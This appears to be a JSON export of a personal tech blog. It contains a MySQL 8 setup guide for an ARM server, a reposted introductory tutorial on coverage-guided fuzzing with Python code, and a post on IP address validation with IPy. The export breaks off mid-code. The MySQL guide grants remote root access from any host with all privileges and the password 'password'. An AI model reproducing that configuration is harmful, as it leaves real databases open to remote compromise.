{"meta":{"title":"Mundi's Space","subtitle":"Be wise and fool.","description":null,"author":"寒雨","url":"https://mundi-xu.github.io"},"pages":[{"title":"about","date":"2020-12-22T15:38:55.000Z","updated":"2020-12-24T14:02:06.726Z","comments":false,"path":"about/index.html","permalink":"https://mundi-xu.github.io/about/index.html","excerpt":"","text":"My name is Mundi, and this is my Blog!!!Hope you have fun here~Then just enjoy the music of my beloved one."}],"posts":[{"title":"华为鲲鹏服务器下MySQL8的安装与远程连接配置","slug":"华为鲲鹏服务器下MySQL8的安装与使用","date":"2021-03-10T15:05:21.000Z","updated":"2021-03-12T10:04:45.423Z","comments":true,"path":"2021/03/10/华为鲲鹏服务器下MySQL8的安装与使用/","link":"","permalink":"https://mundi-xu.github.io/2021/03/10/%E5%8D%8E%E4%B8%BA%E9%B2%B2%E9%B9%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8BMySQL8%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"在华为鲲鹏学生机Ubuntu 20.04.2 LTS (GNU/Linux 4.15.0-136-generic aarch64)上配置安装MySQL8","text":"Docker安装 Docker Version: 20.10.5Site: https://hub.docker.com/r/mysql/mysql-serverUbuntu 20.04.2 LTS (GNU/Linux 4.15.0-136-generic aarch64) Docker的安装就跳过了，直接快进到mysql-server的安装，好消息是mysql官方Docker已经适配了arm64架构，所以直接参照官方文档安装就可以了。 12345678docker pull mysql/mysql-server # 默认选择latestdocker run --name=mysql1 -d mysql/mysql-serverdocker ps # 等待初始化完成，starting变为healthydocker logs mysql1 # 监控容器输出docker logs mysql1 2&gt;&amp;1 | grep GENERATED # 初始化完成后查看密码GENERATED ROOT PASSWORD: Axegh3kAJyDLaRuBemecis&amp;EShOs # 生成的随机密码docker exec -it mysql1 mysql -uroot -p # 输入上面生成的随机密码ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27;; # 修改root密码 包管理器安装 mysql Ver 8.0.23-0ubuntu0.20.04.1 for Linux on aarch64 ((Ubuntu)) 更新源，安装依赖 1234sudo apt-get install mysql-serversudo apt install mysql-clientsudo apt install libmysqlclient-devsudo mysql # 查看是否成功 MySQL配置mysql安装完成后默认是没有密码的,需要先修改密码 1alter user &#39;root&#39;@&#39;localhost&#39; identified by &quot;password&quot;; 远程连接需要单独配置 123sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf# 注释掉bind-address= 127.0.0.1 或改为0.0.0.0sudo service mysql restart # 重启MySQL服务 添加远程连接的账号 123create user root@&#39;%&#39; identified by &#39;password&#39;;grant all privileges on *.* to root@&#39;%&#39;;flush privileges; 最后在华为ECS的安全组配置中开启3306端口就可以远程连接了。","categories":[],"tags":[{"name":"arm64","slug":"arm64","permalink":"https://mundi-xu.github.io/tags/arm64/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://mundi-xu.github.io/tags/Ubuntu/"},{"name":"MySQL","slug":"MySQL","permalink":"https://mundi-xu.github.io/tags/MySQL/"}]},{"title":"【转载】Fuzzing入坑系列-Part1","slug":"Fuzzing入坑系列-Part1","date":"2021-03-05T07:30:58.000Z","updated":"2021-03-12T09:59:08.684Z","comments":false,"path":"2021/03/05/Fuzzing入坑系列-Part1/","link":"","permalink":"https://mundi-xu.github.io/2021/03/05/Fuzzing%E5%85%A5%E5%9D%91%E7%B3%BB%E5%88%97-Part1/","excerpt":"记录一个关于入坑fuzzing的学习历程","text":"本文由RGDZ原创发布https://www.anquanke.com/post/id/232185 前言:最近啃了FuzzingBook，然后记录一个关于入坑fuzzing的学习历程 Fuzzing简介：首先是关于软件测试： 软件测试主要是三种方式： 手工测试 半自动化测试 自动化测试 作者觉得Fuzzing是一种介于自动化和半自动化的测试方法 其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion)失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。 ——维基百科:模糊测试 就Fuzzing来说，模糊测试主要有两个重要的模块组成Fuzzer和Runner 下面是其类图： 一个很简单的调用关系来进行简单的包装，Runner类主要负责将数据输入程序，以及监控程序的运行状态，这次我们先重点介绍Fuzzer Fuzzer对于模糊测试来说，很重要的一点就是对数据进行模糊处理，所以一般在实现上都会单独把Fuzzer模块抽离出来 如上图所示，对于数据变异常用的三种基础的方式是随机删除，随机添加，**随机反转(filp)**，下面是简单的实现代码，我们后续的工作也是基于其来进行的构建 123456789101112131415161718def del_random_chr(s): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)) return s[:pos]+s[pos+1:] def insert_random_chr(s): pos = random.randint(0, len(s)) new_s = chr(random.randrange(32, 127)) return s[:pos]+new_s+s[pos:] def flip_random_chr(s): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)-1) bit = 1&lt;&lt;random.randint(0, 6) return s[:pos]+chr(ord(s[pos])^bit)+s[pos+1:] 为了跟完善一点，在fuzzingbook中，作者将其包装成一个类 123456789101112131415161718192021222324252627282930313233class Mutator(object): def __init__(self): self.mutators = [ self.del_random_chr, self.insert_random_chr, self.flip_random_chr ] def del_random_chr(self, s:str): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)) return s[:pos]+s[pos+1:] def insert_random_chr(self, s:str): pos = random.randint(0, len(s)) new_s = chr(random.randrange(32, 127)) return s[:pos]+new_s+s[pos:] def flip_random_chr(self, s:str): if s is None: return self.insert_random_chr(s) pos = random.randint(0, len(s)-1) bit = 1&lt;&lt;random.randint(0, 6) return s[:pos]+chr(ord(s[pos])^bit)+s[pos+1:] def mutate(self, s): mutator = random.choice(self.mutators) return mutator(s) 在这一部分中，主要是包装数据进行基础变异处理的一些方法，还不能成为Fuzzer 下面是一个Fuzzer的基类 12345678910111213141516class Fuzzer(object): def __init__(self): pass def fuzz(self): return &quot;&quot; def run(self, runner:Runner=Runner()): return runner.run(inp=self.fuzz()) def runs(self, runner:Runner=PrintRunner(), trials=10): outcomes = [self.run(runner) for i in range(trials)] return outcomes 基类的构建主要是为了Runner和Fuzzer联系起来，可以看见其仅仅提供基础的run方法，主要是将我们进行fuzz处理后的数据输入到Runner里面去，由Runner传递给我们Target程序 有了上面的基础部件，我们下面就能够实现一个简单突变Fuzzer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960class Seed(object): def __init__(self, data): self.data = data def __str__(self): return self.data __repr__ = __str__class PowerSchedule(object): def assignEnergy(self, population): for seed in population: seed.energy = 1 def normalizedEnergy(self, population): energy = list(map(lambda seed: seed.energy, population)) sum_energy = sum(energy) norm_energy = list(map(lambda nrg: nrg/sum_energy, energy)) return norm_energy def choose(self, population): self.assignEnergy(population) norm_energy = self.normalizedEnergy(population) seed = np.random.choice(population, p=norm_energy) return seedclass MutationFuzzer(Fuzzer): def __init__(self, seeds, mutator, schedule): self.seeds = seeds self.mutator = mutator self.schedule = schedule self.inputs = [] self.reset() def reset(self): self.population = list(map(lambda x: Seed(x), self.seeds)) self.seed_idx = 0 def create_candidate(self): seed:Seed = self.schedule.choose(self.population) candidate = seed.data trials = min(len(candidate), 1 &lt;&lt; random.randint(1, 5)) for i in range(trials): candidate = self.mutator.mutate(candidate) return candidate def fuzz(self): if self.seed_idx &lt; len(self.seeds): self.inp = self.seeds[self.seed_idx] self.seed_idx += 1 return self.inp self.inp = self.create_candidate() self.inputs.append(self.inp) return self.inp Seed类主要是为了对种子数据进行一些包装，使得我们能够赋予种子数据一些相关数据，方便我们后续对数据的处理 PowerSchedule类相当于一个调度表，主要目的是为了通过种子数据的权级关系来引导后续数据的生成，简单点说，就是对种子数据的权重进行管理 相对核心的MutationFuzzer类，其继承于Fuzzer基类，同时能将我们的所给种子数据进行突变模糊 测试代码: 1234seed_input = &quot;http://www.google.com/search?q=fuzzing&quot;mutation_fuzzer = MutationFuzzer(seeds=[seed_input], mutator=Mutator(), schedule=PowerSchedule())for i in range(10): print(mutation_fuzzer.fuzz()) 输出: 1234567891011$&gt; python3 mutator_test.pyhttp://www.google.com/search?q=fuzzinghttp:/ww.gooc:le.co/earcH?q&lt;nuzinYght#tp!://ww7.gogle&amp;com/seamrch?q=cfuozzingzLIhtp:/www.g1oogxencOm/bpsgarch?qw=fuzzinght+t[r/www.google.com/search?1=furzng`ttq:3/7wg.goggne&gt;com/sarch?=uuzinwhttp://www.google.com[/search?q=fuzzing;http://www.g%oogl.c`omd-se]rc?qfi9ohtp:/cww.qgoglg.coi/search?pfuzajghttp:/+www.eoogle.coe/ search?q=fuzzing 确实将数据进行了模糊处理，但其似乎太发散了，基本不在我们可控范围内，所以我们需要考虑一种方案，其能够引导我们的Fuzzer来生成数据，相当于一种具有引导性的Fuzzer，所以我们需要学习一个新的概念：Code Coverage(代码覆盖率) Code Coverage: 代码覆盖（英语：Code coverage）是软件测试中的一种度量，描述程序中源代码被测试的比例和程度，所得比例称为代码覆盖率。 ——维基百科:代码覆盖率 关于代码覆盖率，其实顾名思义，说简单了也就是我们输入的数据，能够让程序的那些代码得倒执行以及其执行的次数，包括其执行次数占总数的一个比例。 在FuzzingBook中，其作者举了一个🌰： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384/* CGI decodeing as c program */#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#define DEBUG 0typedef unsigned int bool;bool true = 1;bool false = 0;int hex_values[256];#define HEX_VALUES_LENGTH sizeof(hex_values)/sizeof(int)void init_hex_values() &#123; for (int i = 0; i &lt; HEX_VALUES_LENGTH; i++) &#123; hex_values[i] = -1; &#125; for (char i=&#x27;0&#x27;; i&lt;=&#x27;9&#x27;; i++) &#123; hex_values[i] = i-&#x27;0&#x27;; &#125; for (char i=&#x27;a&#x27;; i&lt;=&#x27;f&#x27;; i++) &#123; hex_values[i] = i-&#x27;a&#x27;+0xa; &#125; for (char i=&#x27;A&#x27;; i&lt;=&#x27;F&#x27;; i++) &#123; hex_values[i] = i-&#x27;A&#x27;+0xA; &#125;&#125;bool cgi_decode(char *s, char *t) &#123; while (*s!=&#x27;\\0&#x27;) &#123; switch (*s) &#123; case &#x27;+&#x27;: *t++ = &#x27; &#x27;; break; case &#x27;%&#x27;: &#123; int dight_high = *++s; int dight_low = *++s; if (hex_values[dight_high]&lt;0 &amp;&amp; hex_values[dight_low]&lt;0) &#123; return false; &#125; *t++ = (hex_values[dight_high]&lt;&lt;4) + hex_values[dight_low]; &#125; break; default: *t++ = *s; break; &#125; s++; &#125; *t = &#x27;\\0&#x27;; return true;&#125;int main(int argc, char const *argv[])&#123; init_hex_values();// #if DEBUG// for (int i=0; i&lt;HEX_VALUES_LENGTH; i++) &#123;// printf(&quot;%c:0x%x\\n&quot;, i, hex_values[i]);// &#125;// #endif if (argc&gt;=2) &#123; char* s = (char*)argv[1]; char* t = malloc(strlen(s)+1); bool ret = cgi_decode(s, t); printf(&quot;%s\\n&quot;, t); return ret; &#125; printf(&quot;cgi_decode: usage: cgi_decode STRING\\n&quot;); return 0;&#125; 终端: 123456$&gt; gcc cgi_decode.c --coverage -o cgi_decode$&gt; ./cgi_decode &#x27;Send+mail+to+me%40fuzzingbook.org&#x27;$&gt; gcov cgi_decode.cFile &#x27;cgi_decode.c&#x27;Lines executed:92.86% of 42cgi_decode.c:creating &#x27;cgi_decode.c.gcov&#x27; 然后在生成的.c.gcov文件中如图所示 最左边就是每一行代码执行到的次数 对于python代码，作者构建了一个Coverage类来记录代码覆盖率: 12345678910111213141516171819202122232425262728class Coverage(object): def traceit(self, frame, event, arg): if self.original_trace_function is not None: self.original_trace_function(frame, event, arg) if event == &quot;line&quot;: function_name = frame.f_code.co_name lineno = frame.f_lineno self._trace.append((function_name, lineno)) return self.traceit def __init__(self): self._trace = [] def __enter__(self): self.original_trace_function = sys.gettrace() sys.settrace(self.traceit) return self def __exit__(self, exc_type, exc_value, tb): sys.settrace(self.original_trace_function) def trace(self): return self._trace def coverage(self): return set(self.trace()) 这样的话就可以通过这个Coverage类来使用with语句来记录代码覆盖率 测试代码: 1234with Coverage() as cov: cgi_decode(&quot;a+b&quot;) print(cov.coverage()) 终端: 12$&gt; python3 coverage_test.py&#123;(&#x27;cgi_decode&#x27;, 24), (&#x27;cgi_decode&#x27;, 30), (&#x27;cgi_decode&#x27;, 43), (&#x27;cgi_decode&#x27;, 33), (&#x27;cgi_decode&#x27;, 23), (&#x27;__exit__&#x27;, 38), (&#x27;cgi_decode&#x27;, 32), (&#x27;cgi_decode&#x27;, 45), (&#x27;cgi_decode&#x27;, 29), (&#x27;cgi_decode&#x27;, 25), (&#x27;cgi_decode&#x27;, 22), (&#x27;cgi_decode&#x27;, 28), (&#x27;cgi_decode&#x27;, 44), (&#x27;cgi_decode&#x27;, 31), (&#x27;cgi_decode&#x27;, 21), (&#x27;cgi_decode&#x27;, 34)&#125; 了解代码覆盖率之后，我们就可以使用代码覆盖率，来引导我们的Fuzzer来生成数据，相当于一种具有引导性突变的Fuzzer，我们称为GreyboxFuzzer，下面是实现这个类的代码 12345678910111213141516class GreyboxFuzzer(MutationFuzzer): def reset(self): super().reset() self.coverages_seen = set() self.population = [] def run(self, runner: Runner): result, outcome = super().run(runner=runner) new_coverage = frozenset(runner.coverage()) if new_coverage not in self.coverages_seen: seed = Seed(self.inp) seed.coverage = runner.coverage() self.coverages_seen.add(new_coverage) self.population.append(seed) return (result, outcome) 在MutationCoverageFuzzer类的Run方法中，我们实际上至少比较了每一次Runner执行后的，其输入的数据是否让程序执行到新的代码块，如果有则记录下来，同时将这一次的数据加入到进行帅选到种子列表中，作为下次突变的数据种子，这样就有机会让我们Fuzzer生成出来的数据能够广的代码覆盖率。 下面是MutationFuzzer和GreyboxFuzzer的测试对比, 依然使用FuzzingBook中的测试例子，也是一个很有趣的🌰 Target程序代码: 123456def crashme (s): if len(s) &gt; 0 and s[0] == &#x27;b&#x27;: if len(s) &gt; 1 and s[1] == &#x27;a&#x27;: if len(s) &gt; 2 and s[2] == &#x27;d&#x27;: if len(s) &gt; 3 and s[3] == &#x27;!&#x27;: raise Exception() MutationFuzzer测试代码: 123456789101112seed_input = &quot;good&quot;blackbox_fuzzer = MutationFuzzer([seed_input], Mutator(), PowerSchedule())n = 30000 # 测试次数blackbox_runner = FunctionCoverageRunner(crashme)with Timer() as t: blackbox_fuzzer.runs(blackbox_runner, trials=n)all_cov, greybox_coverage = population_coverage(blackbox_fuzzer.inputs, crashme)print(t.elapsed_time())print(all_cov)print(max(greybox_coverage)) 终端: 1234$&gt; python3 mutator_test.py1.489651209&#123;(&#x27;crashme&#x27;, 3), (&#x27;__exit__&#x27;, 38), (&#x27;crashme&#x27;, 2)&#125;3 GreyboxFuzzer测试代码 1234567891011121314seed_input = &quot;good&quot;n = 30000greybox_fuzzer = GreyboxFuzzer([seed_input], Mutator(), PowerSchedule())runner = FunctionCoverageRunner(crashme)with Timer() as t: greybox_fuzzer.runs(runner, trials=n)all_cov, greybox_coverage = population_coverage(greybox_fuzzer.inputs, crashme)print(t.elapsed_time())# print(runner.coverage())print(all_cov)print(max(greybox_coverage))print(greybox_fuzzer.population) 终端： 12345$&gt; python3 greyboxFuzzer.py1.7056656000000001&#123;(&#x27;crashme&#x27;, 3), (&#x27;crashme&#x27;, 6), (&#x27;crashme&#x27;, 2), (&#x27;crashme&#x27;, 5), (&#x27;crashme&#x27;, 4), (&#x27;__exit__&#x27;, 38)&#125;6[good, bEgd, bar$Egdi, badEdi, bad!Egi] 下面是FuzzingBook所给出的一张对比图，可以直观的发现，没有代码覆盖率引导的普通数据变异很难覆盖完程序的路径，而通过代码覆盖率的引导，Fuzzer生成的数据能逐渐的覆盖程序的路径。 AFLFastSchedule:在我们Fuzz crashme这个例子中，通过上节的实验我们可以发现使用代码覆盖率来引导我们的Fuzzer，可以使其变得更有目的性的去生成变异数据，但其耗时还是相对较长，且fuzzing出来的的数据也相对较多，那么有没有优化的方案呢？ 在FuzzingBook中，作者使用如下公式来计算种子数据的权重 e(s) =\\frac{1}{f(p(s))^e} 实际上很容易理解: s是种子，作为一个参数 函数p用来获取该种子所覆盖的路径hash值 函数f用来获取该路径已经被种子覆盖的次数 e是一个指数常量，用来扩大数量级，通过调整这个e的常量值，我们能减少fuzz的次数, 来提升fuzzer的效率 AFLFastSchedule类实现代码: 12345678class AFLFastSchdule(PowerSchedule): def __init__(self, exponent): self.exponent = exponent self.path_frequency = &#123;&#125; def assignEnergy(self, population:List[Seed]): for seed in population: seed.energy = 1 / (self.path_frequency[getPathID(seed.coverage)] ** self.exponent) AFLFastSchedule类继承PowerSchedule，重写了assignEnergy方法，重新通过上诉公式来计算种子的权重 CountGreyboxFuzzer类实现代码: 12345678910111213141516class CountingGreyboxFuzzer(GreyboxFuzzer): def __init__(self, seeds, mutator: Mutator, schedule: AFLFastSchdule): super().__init__(seeds, mutator, schedule) self.schedule = schedule def reset(self): return super().reset() def run(self, runner: Runner): result, outcome = super().run(runner) path_id = getPathID(runner.coverage()) if path_id not in self.schedule.path_frequency: self.schedule.path_frequency[path_id] = 1 return result, outcome self.schedule.path_frequency[path_id] += 1 return result, outcome CountGreyboxFuzzer类继承GreyboxFuzzer，主要重写run方法，将检测代码路径是否已被执行替换为增加路径已执行次数，相比较原来的普通greyboxFuzzer，这样当下一次种子调度器在帅选种子时，就有权重变化了。 通过公式的描述，我们可以发现当一个路径被覆盖多次时，他的权重会减少，而较新的路径的权重反而更大，而目前我们的种子调度器帅选种子主要依赖其权重，那么这就相当于种子调度器在帅选种子来进行变异时，会逐渐逐渐往新路径选择，这在一定程度上更能引导我们的Fuzzer去变异出代码覆盖率更广的数据。 下面是实验结果： Test_CountingGreyboxFuzzer: 1234567891011121314151617def test_countingGreyboxFuzzer(e): seed_input = &quot;good&quot; exponent = e n = 10000 fast_schedule = AFLFastSchdule(exponent) bostgreybox_fuzzer = CountingGreyboxFuzzer([seed_input], Mutator(), fast_schedule) runner = FunctionCoverageRunner(crashme) with Timer() as t: bostgreybox_fuzzer.runs(runner, trials=n) _, bostgreybox_coverage = population_coverage(bostgreybox_fuzzer.inputs, crashme) print(t.elapsed_time()) # print(all_cov) print(max(bostgreybox_coverage)) print(bostgreybox_fuzzer.population) print(fast_schedule.path_frequency) 当e常量为5，fuzz次数为10000时 终端: 12345$&gt; python3 greyboxFuzzer_test.py0.7238507586[good, bg, ba, bad, bad!]&#123;&#x27;457ea827d94ad12c048397ad55d1d030&#x27;: 6005, &#x27;193f98a7531d0e9a97a787562b595798&#x27;: 2743, &#x27;80819e22a0983ebc96997fa6fe569ca8&#x27;: 942, &#x27;00deafe57bb3539da4ee5a01d5fb4ebe&#x27;: 260, &#x27;c9a83c563333fdb248e6a10e56aa1f12&#x27;: 50&#125; 当我们调整e为15，trials为4000时 终端: 12345$&gt; python3 greyboxFuzzer_test.py0.2516159326[good, bg=oyodx, ba7g=oyodz,, badBag(yoC&gt;,, bad!sgymIn&#125;C1&lt;]&#123;&#x27;fbdecb7cc922b14d42f4a4a4d5dc191a&#x27;: 1318, &#x27;a2229a3e7370c6970c660ec9f7e2a67b&#x27;: 763, &#x27;1968f4fca86e35f60decaae9699c760d&#x27;: 502, &#x27;4ea124940551c3bbb6d1f68e8337375e&#x27;: 212, &#x27;79723bb9baab9395463be50202282c3e&#x27;: 205&#125; 可以发现，通过一定调整exponent常量，我们可以接近一个更有效率的测试次数值 下图是三个不同的Fuzzer的效率对比 我们可以发现，使用AFLFastSchedule优化过的Fuzzer在三者之中覆盖crashme的效率确实是要更快的多。 总结通过该部分的学习，我们基本了解了什么是Fuzzing，以及如何编写基于python程序的Fuzzer，同时根据相关理论指导来优化我们的Fuzzer。","categories":[],"tags":[{"name":"Fuzzing","slug":"Fuzzing","permalink":"https://mundi-xu.github.io/tags/Fuzzing/"}]},{"title":"利用IPy判断IP地址的合法性","slug":"利用IPy判断IP地址的合法性","date":"2021-03-02T15:00:11.000Z","updated":"2021-03-09T09:36:55.740Z","comments":true,"path":"2021/03/02/利用IPy判断IP地址的合法性/","link":"","permalink":"https://mundi-xu.github.io/2021/03/02/%E5%88%A9%E7%94%A8IPy%E5%88%A4%E6%96%ADIP%E5%9C%B0%E5%9D%80%E7%9A%84%E5%90%88%E6%B3%95%E6%80%A7/","excerpt":"利用IPy模块的IP类处理常见格式的IP地址，附IP地址格式规范和IPy源码简析","text":"ip地址格式规范ipv4在CIDR表示法中，前缀显示为4个八位字节，就像传统的IPv4地址一样，后跟”/“斜杠和一个0～32之间的十进制值来描述有效位数。[1] For example, the legacy “Class B” network 172.16.0.0, with an implied network mask of 255.255.0.0, is defined as the prefix 172.16.0.0/16, the “/16” indicating that the mask to extract the network portion of the prefix is a 32-bit value where the most significant 16 bits are ones and the least significant 16 bits are zeros.Similarly, the legacy “Class C” network number 192.168.99.0 is defined as the prefix 192.168.99.0/24; the most significant 24 bits are ones and the least significant 8 bits are zeros. ipv6There are three conventional forms for representing IPv6 addresses as text strings: [2] The preferred form is x:x:x:x:x:x:x:x, where the ‘x’s are the hexadecimal values of the eight 16-bit pieces of the address.Examples: FEDC:BA98:7654:3210:FEDC:BA98:7654:3210 1080:0:0:0:8:800:200C:417A Note that it is not necessary to write the leading zeros in an individual field, but there must be at least one numeral in every field (except for the case described in 2.). Due to some methods of allocating certain styles of IPv6 addresses, it will be common for addresses to contain long strings of zero bits. In order to make writing addresses containing zero bits easier a special syntax is available to compress the zeros. The use of “::” indicates multiple groups of 16-bits of zeros. The “::” can only appear once in an address. The “::” can also be used to compress the leading and/or trailing zeros in an address.For example the following addresses: 1080:0:0:0:8:800:200C:417A a unicast address FF01:0:0:0:0:0:0:101 a multicast address 0:0:0:0:0:0:0:1 the loopback address 0:0:0:0:0:0:0:0 the unspecified addresses may be represented as: 1080::8:800:200C:417A a unicast address FF01::101 a multicast address ::1 the loopback address :: the unspecified addresses An alternative form that is sometimes more convenient when dealing with a mixed environment of IPv4 and IPv6 nodes is x:x:x:x:x:x:d.d.d.d, where the ‘x’s are the hexadecimal values of the six high-order 16-bit pieces of the address, and the ‘d’s are the decimal values of the four low-order 8-bit pieces of the address (standard IPv4 representation). Examples: 0:0:0:0:0:0:13.1.68.3 0:0:0:0:0:FFFF:129.144.52.38 or in compressed form: ::13.1.68.3 ::FFFF:129.144.52.38 IPv6地址前缀的文本表示类似于以CIDR表示法编写IPv4地址前缀的方式: IPv6地址/有效位数 IPy模块的使用安装Ipy模块 1pip install IPy IPy模块包含IP类，使用它可以处理绝大部分格式的IPv4或IPv6地址[3]。 It can detect about a dozen different ways of expressing IP addresses and networks, parse them and distinguish between IPv4 and IPv6 addresses: 通过version方法来区分出IPv4和IPv6 1234&gt;&gt;&gt; IP(&#x27;10.0.0.0/8&#x27;).version()4&gt;&gt;&gt; IP(&#x27;::1&#x27;).version()6 通过strNormal指定不同的wantprefixlen值控制输出 123456789101112131415161718192021&gt;&gt;&gt; IP(&#x27;10.0.0.0/32&#x27;).strNormal()&#x27;10.0.0.0&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal()&#x27;10.0.0.0/24&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(0)&#x27;10.0.0.0&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(1)&#x27;10.0.0.0/24&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(2)&#x27;10.0.0.0/255.255.255.0&#x27;&gt;&gt;&gt; IP(&#x27;10.0.0.0/24&#x27;).strNormal(3)&#x27;10.0.0.0-10.0.0.255&#x27;&gt;&gt;&gt; ip = IP(&#x27;10.0.0.0&#x27;)&gt;&gt;&gt; print(ip)10.0.0.0&gt;&gt;&gt; ip.NoPrefixForSingleIp = None&gt;&gt;&gt; print(ip)10.0.0.0/32&gt;&gt;&gt; ip.WantPrefixLen = 3&gt;&gt;&gt; print(ip)10.0.0.0-10.0.0.0 实现代码123456789101112131415161718192021from IPy import IPdef is_ip(ip_str): try: ip = IP(ip_str) return True except Exception as e: print(&quot;The address is illegal.&quot;) return Falseip_str = input(&quot;Please enter the IP address:\\n &quot;)if is_ip(ip_str): ip = IP(ip_str) version = ip.version() print(&quot;The address is IPv&quot;, version, sep=&#x27;&#x27;) if ip.len() &gt; 1: print(&quot;Available address segment is:&quot;, ip.strNormal(3)) print(&quot;The number of address is:&quot;, ip.len()) else: print(&quot;The binary address is:&quot;, ip.strBin()) 测试结果1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465testcase 1Please enter the IP address: 0.0.0.0The address is IPv4The binary address is: 00000000000000000000000000000000---------------------------------testcase 2Please enter the IP address: 255.255.255.255The address is IPv4The binary address is: 11111111111111111111111111111111---------------------------------testcase 3Please enter the IP address: 256.0.1.1The address is illegal.---------------------------------testcase 4Please enter the IP address: 192.168.0.0/24The address is IPv4Available address segment is: 192.168.0.0-192.168.0.255The number of address is: 256---------------------------------testcase 5Please enter the IP address: 192.168.1.1/24The address is illegal.---------------------------------testcase 6Please enter the IP address: ::1/128The address is IPv6The binary address is: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001---------------------------------testcase 7Please enter the IP address: FEDC:BA98:7654:3210:FEDC:BA98:7654:3210The address is IPv6The binary address is: 11111110110111001011101010011000011101100101010000110010000100001111111011011100101110101001100001110110010101000011001000010000---------------------------------testcase 8Please enter the IP address: 1080::8:800:200C:417A/24The address is illegal.---------------------------------testcase 9Please enter the IP address: FF01::101The address is IPv6The binary address is: 11111111000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000001---------------------------------testcase 10Please enter the IP address: ::The address is IPv6The binary address is: 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000---------------------------------testcase 11Please enter the IP address: ::/64The address is IPv6Available address segment is: 0:0:0:0:0:0:0:0-0000:0000:0000:0000:ffff:ffff:ffff:ffffThe number of address is: 18446744073709551616--------------------------------- IPy源码分析 IPy - class and tools for handling of IPv4 and IPv6 addresses and networks. 源码版本为1.01 __version__ = &#39;1.01&#39; [4] ipversion1234567891011121314151617if isinstance(data, INT_TYPES): self.ip = int(data) if ipversion == 0: if self.ip &lt;= MAX_IPV4_ADDRESS: ipversion = 4 else: ipversion = 6 if ipversion == 4: if self.ip &gt; MAX_IPV4_ADDRESS: raise ValueError(&quot;IPv4 Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV4_ADDRESS, self.ip)) prefixlen = 32 elif ipversion == 6: if self.ip &gt; MAX_IPV6_ADDRESS: raise ValueError(&quot;IPv6 Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV6_ADDRESS, self.ip)) prefixlen = 128 else: raise ValueError(&quot;only IPv4 and IPv6 supported&quot;) 根据处理后的ip长度判断类型，其中MAX_IPV4_ADDRESS = 0xffffffff, MAX_IPV6_ADDRESS = 0xffffffffffffffffffffffffffffffff strbin12345bits = _ipVersionToLen(self._ipversion)if self.WantPrefixLen == None and wantprefixlen == None: wantprefixlen = 0ret = _intToBin(self.ip)return &#x27;0&#x27; * (bits - len(ret)) + ret + self._printPrefix(wantprefixlen) strnormal123456789if self.WantPrefixLen == None and wantprefixlen == None: wantprefixlen = 1if self._ipversion == 4: ret = self.strFullsize(0) # Return a string representation in the non-mangled format.elif self._ipversion == 6: ret = &#x27;:&#x27;.join([&quot;%x&quot; % x for x in [int(x, 16) for x in self.strFullsize(0).split(&#x27;:&#x27;)]])else: raise ValueError(&quot;only IPv4 and IPv6 supported&quot;) len123bits = _ipVersionToLen(self._ipversion) # Return number of bits in address for a certain IP version.(32 or 128)locallen = bits - self._prefixlenreturn 2 ** locallen 范围IP分解 123if isinstance(key, slice): return [IP(IPint.__getitem__(self, x), ipversion=self._ipversion) for x in xrange(*key.indices(len(self)))] return IP(IPint.__getitem__(self, key), ipversion=self._ipversion) getIPv4Map12345678if self._ipversion != 6: return Noneif (self.ip &gt;&gt; 32) != 0xffff: return Noneipv4 = self.ip &amp; MAX_IPV4_ADDRESSif self._prefixlen != 128: ipv4 = &#x27;%s/%s&#x27; % (ipv4, 32-(128-self._prefixlen))return IP(ipv4, ipversion=4) IP输入格式检测解析字符串并返回相应的整数型IP地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def parseAddress(ipstr, ipversion=0): try: hexval = int(ipstr, 16) except ValueError: hexval = None try: intval = int(ipstr, 10) except ValueError: intval = None if ipstr.startswith(&#x27;0x&#x27;) and hexval is not None: if hexval &gt; MAX_IPV6_ADDRESS: raise ValueError(&quot;IP Address can&#x27;t be larger than %x: %x&quot; % (MAX_IPV6_ADDRESS, hexval)) if hexval &lt;= MAX_IPV4_ADDRESS: return (hexval, 4) else: return (hexval, 6) if ipstr.find(&#x27;:&#x27;) != -1: return (_parseAddressIPv6(ipstr), 6) elif len(ipstr) == 32 and hexval is not None: # assume IPv6 in pure hexadecimal notation return (hexval, 6) elif ipstr.find(&#x27;.&#x27;) != -1 or (intval is not None and intval &lt; 256 and ipversion != 6): # assume IPv4 (&#x27;127&#x27; gets interpreted as &#x27;127.0.0.0&#x27;) bytes = ipstr.split(&#x27;.&#x27;) if len(bytes) &gt; 4: raise ValueError(&quot;IPv4 Address with more than 4 bytes&quot;) bytes += [&#x27;0&#x27;] * (4 - len(bytes)) bytes = [int(x) for x in bytes] for x in bytes: if x &gt; 255 or x &lt; 0: raise ValueError(&quot;%r: single byte must be 0 &lt;= byte &lt; 256&quot; % (ipstr)) return ((bytes[0] &lt;&lt; 24) + (bytes[1] &lt;&lt; 16) + (bytes[2] &lt;&lt; 8) + bytes[3], 4) elif intval is not None: # we 